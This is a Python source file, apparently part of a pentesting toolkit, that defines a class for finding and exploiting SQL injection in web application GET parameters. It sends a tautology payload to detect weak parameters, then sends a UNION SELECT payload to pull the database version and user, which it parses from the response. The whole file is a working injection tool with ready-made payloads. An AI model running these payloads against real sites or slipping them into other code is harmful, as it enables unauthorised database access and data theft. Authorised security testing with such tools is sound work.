"""
modules/pentesting_tools/sql_injection_tester.py

This module provides tools for detecting and exploiting SQL injection vulnerabilities
in web applications. It includes automated detection and payload testing functionalities.
"""

import requests
from urllib.parse import urljoin, urlencode
import re


class SQLInjectionTester:
    """
    A tool for detecting and exploiting SQL injection vulnerabilities in web applications.
    """

    def __init__(self, url):
        """
        Initializes the SQLInjectionTester with a target URL.
        :param url: The base URL of the web application to test.
        """
        self.base_url = url

    def detect_vulnerability(self, params):
        """
        Detects if a given URL is vulnerable to SQL injection.
        :param params: Dictionary of GET parameters to test.
        :return: List of vulnerable parameters.
        """
        vulnerable_params = []
        injection_payload = "' OR '1'='1"
        print(f"Testing for SQL injection at: {self.base_url}")

        for param in params:
            test_params = params.copy()
            test_params[param] += injection_payload
            full_url = urljoin(self.base_url, "?" + urlencode(test_params))

            try:
                response = requests.get(full_url)
                if "syntax error" in response.text.lower() or "unexpected" in response.text.lower():
                    print(f"Potential vulnerability found in parameter: {param}")
                    vulnerable_params.append(param)
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")

        return vulnerable_params

    def exploit(self, params, payload):
        """
        Attempts to exploit SQL injection vulnerabilities with a custom payload.
        :param params: Dictionary of GET parameters to exploit.
        :param payload: The SQL injection payload to use.
        :return: Response content from the server.
        """
        exploit_params = params.copy()
        for param in params:
            exploit_params[param] += payload
        full_url = urljoin(self.base_url, "?" + urlencode(exploit_params))

        print(f"Exploiting with payload: {payload}")
        try:
            response = requests.get(full_url)
            return response.text
        except Exception as e:
            print(f"Error during exploitation: {e}")
            return None

    @staticmethod
    def parse_database_output(response_text):
        """
        Parses potential database output from the server response.
        :param response_text: The server response content.
        :return: Extracted database information if found.
        """
        database_info_patterns = [
            r"Database: ([\w\d_]+)",
            r"Version: ([\w\d\.]+)",
            r"User: ([\w\d_]+)"
        ]
        extracted_info = {}
        for pattern in database_info_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                extracted_info[pattern.split(":")[0]] = match.group(1)
        return extracted_info


if __name__ == "__main__":
    # Example Usage
    target_url = "https://example.com/search"
    parameters = {"query": "test", "page": "1"}

    sql_tester = SQLInjectionTester(target_url)

    # Detect vulnerabilities
    print("Detecting SQL injection vulnerabilities...")
    vulnerable = sql_tester.detect_vulnerability(parameters)
    print("Vulnerable parameters:", vulnerable)

    # Exploit vulnerabilities
    if vulnerable:
        print("Exploiting vulnerabilities...")
        payload = "' UNION SELECT null, version(), user()--"
        response = sql_tester.exploit(parameters, payload)
        print("Exploitation response:", response)

        # Parse database output
        db_info = sql_tester.parse_database_output(response)
        print("Extracted database information:", db_info)
